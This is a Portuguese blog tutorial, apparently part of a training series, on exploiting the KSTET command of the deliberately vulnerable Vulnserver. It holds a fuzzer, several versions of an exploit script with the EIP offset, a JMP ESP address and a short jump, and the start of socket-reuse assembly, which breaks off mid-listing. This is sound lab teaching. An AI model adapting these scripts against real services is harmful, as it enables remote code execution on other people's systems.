@@ -1,0 +1,595 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Windows Vulnserver Buffer Overflow - Parte 5 Reuso de Socket" /><meta name="author" content="Hastur" /><meta property="og:locale" content="en" /><meta name="description" content="COMANDO KSTET" /><meta property="og:description" content="COMANDO KSTET" /><link rel="canonical" href="https://h41stur.github.io/posts/std-winbof-5/" /><meta property="og:url" content="https://h41stur.github.io/posts/std-winbof-5/" /><meta property="og:site_name" content="H41stur" /><meta property="og:image" content="https://h41stur.github.io/img/std/winbof/winbof-logo-5.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-10-06T16:00:00-03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://h41stur.github.io/img/std/winbof/winbof-logo-5.png" /><meta property="twitter:title" content="Windows Vulnserver Buffer Overflow - Parte 5 Reuso de Socket" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Hastur" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Hastur"},"dateModified":"2021-12-13T15:54:13-03:00","datePublished":"2021-10-06T16:00:00-03:00","description":"COMANDO KSTET","headline":"Windows Vulnserver Buffer Overflow - Parte 5 Reuso de Socket","image":"https://h41stur.github.io/img/std/winbof/winbof-logo-5.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://h41stur.github.io/posts/std-winbof-5/"},"url":"https://h41stur.github.io/posts/std-winbof-5/"}</script><title>Windows Vulnserver Buffer Overflow - Parte 5 Reuso de Socket | H41stur</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="H41stur"><meta name="application-name" content="H41stur"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://h41stur.github.io/img/h41stur.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">H41stur</a></div><div class="site-subtitle font-italic">Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARQUIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>SOBRE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/h41stur" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['leonardor.toledo','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/leo-toledo/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Windows Vulnserver Buffer Overflow - Parte 5 Reuso de Socket</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Windows Vulnserver Buffer Overflow - Parte 5 Reuso de Socket</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Hastur </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Oct 6, 2021, 4:00 PM -0300" >Oct 6, 2021<i class="unloaded">2021-10-06T16:00:00-03:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Dec 13, 2021, 3:54 PM -0300" >Dec 13, 2021<i class="unloaded">2021-12-13T15:54:13-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2288 words">12 min read</span></div></div><div class="post-content"><h1 id="comando-kstet">COMANDO KSTET</h1><p>O comando KSTET, assim como os demais, recebe um argumento e dá uma resposta. Neste comando temos um problema de espaço muito menor que os demais. Precisaremos pensar fora da caixa, portanto iremos explorar outa tecnica de exploração de buffer overflow.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-62.png" alt="Enumaração do comando." /></p><h2 id="fuzzing">FUZZING</h2><p>Vamos reaproveitar nosso primeiro script de fuzzing, adaptando para o envio do comando KSTET.</p><p>fuzzing.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="kn">import</span> <span class="n">sys</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">KSTET </span><span class="sh">"</span> <span class="c1"># funcao inicial
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">100</span> <span class="c1"># quantidade inicial de bytes 
+</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+        <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+        <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">100</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Buffer estourado em %s bytes</span><span class="sh">"</span><span class="o">%</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))))</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+</pre></table></code></div></div><p>Ao rodar nosso script, temos o retorno da quantidade de bytes para estouro de buffer.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-63.png" alt="Enumaração do comando." /></p><p>Temos um offset de 206 bytes para causarmos o crash, vamos esboçar nosso script e testar com o vulnserver no Immunity Debugger.</p><p>xplkstet.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="n">socket</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># variaveis de payload
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">206</span>
+
+<span class="c1"># payload
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="err">”</span><span class="n">KSTET</span> <span class="err">”</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="n">offset</span>
+
+<span class="c1"># criando conexao
+</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+
+<span class="c1"># enviando payload
+</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Enviando payload...</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">b</span><span class="err">”</span>\<span class="n">r</span>\<span class="n">n</span><span class="err">”</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Payload enviado.</span><span class="sh">"</span><span class="p">)</span>
+</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-64.png" alt="Enumaração do comando." /></p><p>Conseguimos sobrescrever o endereço de EIP, isso é ótimo, mas vamos seguir o dump hexa após o envio do KSTET.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-65.png" alt="Enumaração do comando." /></p><p>Nós enviamos 206 “A” com nosso script, porém o buffer tem um espaço de 0x63, ou seja 99 bytes incluindo o comando KSTET.</p><p>Fazer saltos para o inicio do buffer não adiantaria, pois independente de onde cairmos, não teremos espaço para o shellcode. Fazer reuso do socket da forma que fizemos anteriormente também não funcionaria, pois mesmo diminuindo muito o tamanho, nosso shellcode ficou com pouco mais de 140 bytes.</p><p>Precisamos pensar fora da caixa, porém vamos seguir o plano e encontrar o offset para atingir o EIP como fizemos nos demais. Vamos criar a string com o <code class="language-plaintext highlighter-rouge">msf-patter_create</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>msf-pattern_create <span class="nt">-l</span> 206
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag
+</pre></table></code></div></div><p>Após atualizar nosso script, vamos medir o comportamento com o Immunity:</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-66.png" alt="Enumaração do comando." /></p><p>Atingimos o EIP em 63413363, vamos consultar no <code class="language-plaintext highlighter-rouge">msf-pattern_offset</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>msf-pattern_offset <span class="nt">-l</span> 206 <span class="nt">-q</span> 63413363
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 70
+
+</pre></table></code></div></div><p>Temos um offset de 70 bytes para atingir o EIP, vamos atualizar nosso script e tesstar.</p><p>xplkstet.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="n">socket</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># variaveis de payload
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">206</span>
+
+<span class="c1"># payload
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">KSTET </span><span class="sh">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">70</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">70</span><span class="p">)</span>
+<span class="c1"># criando conexao
+</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+
+<span class="c1"># enviando payload
+</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Enviando payload...</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Payload enviado.</span><span class="sh">"</span><span class="p">)</span>
+</pre></table></code></div></div><p>Se o offset estiver correto, nosso EIP será preenchido com os “B”.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-67.png" alt="Enumaração do comando." /></p><p>Sobrescrevemos o EIP com sucesso, vamos procurar um bom endereço de retorno para ESP.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-68.png" alt="Enumaração do comando." /></p><p>Encontramos nossos 9 bons endereços de retorno, podemos utilizar qualquer um, no meu caso utilizarei o 625011d3.</p><p>Vamos inserir o endereço de retorno no lugar de nossos “B” e monitorar o comportamento inserindo um breakpoint neste endereço.</p><p>xplkstet.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="n">socket</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># variaveis de payload
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">206</span>
+
+<span class="c1"># payload
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">KSTET </span><span class="sh">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">70</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xd3\x11\x50\x62</span><span class="sh">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">70</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span>
+<span class="c1"># criando conexao
+</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+
+<span class="c1"># enviando payload
+</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Enviando payload...</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Payload enviado.</span><span class="sh">"</span><span class="p">)</span>
+</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-69.png" alt="Enumaração do comando." /></p><p>Caímos exatamente em nosso buffer de “C”, porém temos somente 13 bytes para aproveitar, absolutamente nada nos termos de exploit, mas temos um buffer de 70 bytes de “A”, o que também não é muita coisa, mas deixa espaço para sermos criativos.</p><p>Vamos calcular o salto para o buffer de “A” com o msf-nasm_shell, temos um salto de 74 bytes para fazer (70 bytes de “A” + 4 bytes do JMP ESP).</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>msf-nasm_shell                       
+nasm <span class="o">&gt;</span> JMP <span class="nv">$-</span>74
+00000000  EBB4              jmp short 0xffffffb6
+
+</pre></table></code></div></div><p>Temos o short jump de \xeb\xb4. Vamos atualizar o script e monitorar. xplkstet.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="n">socket</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># variaveis de payload
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">206</span>
+
+<span class="c1"># payload
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">KSTET </span><span class="sh">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">70</span> <span class="c1"># buffer inicial
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xd3\x11\x50\x62</span><span class="sh">"</span> <span class="c1"># JMP ESP
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xeb\xb4</span><span class="sh">"</span> <span class="c1"># short jump
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x90\x90</span><span class="sh">"</span> <span class="c1"># padding do short jump
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">70</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="c1"># complemento do buffer
+</span>
+<span class="c1"># criando conexao
+</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+
+<span class="c1"># enviando payload
+</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Enviando payload...</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Payload enviado.</span><span class="sh">"</span><span class="p">)</span>
+</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-70.png" alt="Enumaração do comando." /></p><p>Caímos diretamente em nosso buffer de 70 bytes, mas e agora, o que fazer com 70 bytes?</p><p>Vamos pensar fora da caixa e dividir nosso exploit em dois estágios.</p><h2 id="estágio-1-reuso-de-socket">ESTÁGIO 1: REUSO DE SOCKET</h2><p>Quando exploramos o comando GTER, nós reaproveitamos uma parte da função WinSocket para diminuir o tamanho do nosso shellcode para 128 bytes.</p><p>Para conseguirmos encaixar um shellcode em 70 bytes, precisamos reaproveitar algo mais.</p><p>Vamos analizar uma forma simplificada do protocolo TCP:</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-71.png" alt="Enumaração do comando." /></p><p>Diferentes funções são chamadas em cada lado de uma conexão, mas podemos ver que a troca de dados ocorre no final.</p><p>O que precisamos fazer no primeiro estágio é criar uma nova chamada para a função recv() do Windows e reutilizar o socket já criado pelo vulnserver que recebe conexões na porta 9999. Após isto, redirecioná-lo para o nosso estágio 2 que contém o shellcode.</p><p>Vamos analisar a estrutura da recv() cuja documentação pode ser lida <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv">aqui</a>.</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">recv</span><span class="p">(</span>
+  <span class="n">SOCKET</span> <span class="n">s</span><span class="p">,</span>
+  <span class="kt">char</span>   <span class="o">*</span><span class="n">buf</span><span class="p">,</span>
+  <span class="kt">int</span>    <span class="n">len</span><span class="p">,</span>
+  <span class="kt">int</span>    <span class="n">flags</span>
+<span class="p">);</span>
+</pre></table></code></div></div><p>Onde:</p><ul><li><strong>SOCKET s</strong> é o valor do socket handle;<li><strong>char *buf</strong> é o apontador onde os dados recebidos serão armazenados;<li><strong>int len</strong> é a quantidade total de dados esperados;<li><strong>int flags</strong> modifica o valor do recv(), em nosso caso será 0.</ul><p>Com o próprio Immunity Debbuger podemos fazer isso, clicando com o botão direito no painel de CPU e selecionando <code class="language-plaintext highlighter-rouge">“Search for &gt; All intermodular calls”</code>, lá vamos procurar pelo destino “WS2_32.recv” e setar um breakpoint nele.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-72.png" alt="Enumaração do comando." /></p><p>Agora criamos uma conexão simples a partir do nosso Kali utilizando o netcat.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-73.png" alt="Enumaração do comando." /></p><p>No Immunity, podemos clicar duas vezes em nosso breakpoint e obter nossas informações.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-74.png" alt="Enumaração do comando." /></p><p>Conseguimos os valores que precisávamos, o socket handle (104) e o endereço da recv() (0040252C).</p><p>Com os valores em mãos podemos escrever nosso Assembly.</p><p>estagio1.nasm:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="c1">; recv()</span>
+
+<span class="nf">sub</span> <span class="nb">esp</span><span class="nv">.</span> <span class="mi">64</span>             <span class="c1">; Move o apontador ESP para o nosso buffer inicial evitando sobrescrever nosso shellcode</span>
+<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">; Zerando EBX</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Push no parametro 'flags' = 0</span>
+<span class="nf">add</span> <span class="nb">bh</span><span class="p">,</span> <span class="mi">4</span>               <span class="c1">; Tornando EBX = 00000400 = 1024 bytes</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Push do parametro 'len' = 1024 bytes</span>
